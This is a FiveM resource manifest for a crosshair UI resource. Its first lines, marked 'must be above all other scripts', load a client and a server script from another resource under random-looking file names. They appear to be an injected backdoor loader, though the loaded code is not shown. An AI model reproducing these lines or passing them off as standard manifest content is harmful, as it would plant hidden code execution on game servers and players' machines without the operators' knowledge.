-- THIS MUST BE ABOVE ALL OTHER SCRIPTS
client_script "@183-game/SQxtXXJEoS-4f8rpjyu3qyylsaf9ya348.lua"
server_script "@183-game/dtLHXiFVuK-3h5rjemy2sr3mszlf86jln.lua"
------------------------------------------

fx_version 'bodacious'

games { 'rdr3', 'gta5' }

author 'Strax'
version '1.0.0'
description 'FiveM Crosshair'

ui_page 'html/index.html'

client_scripts {
	'client/storage.lua',
	'client/main.lua'
}

files {
	'html/index.html',
	'html/style.css',
	'html/main.js'
}


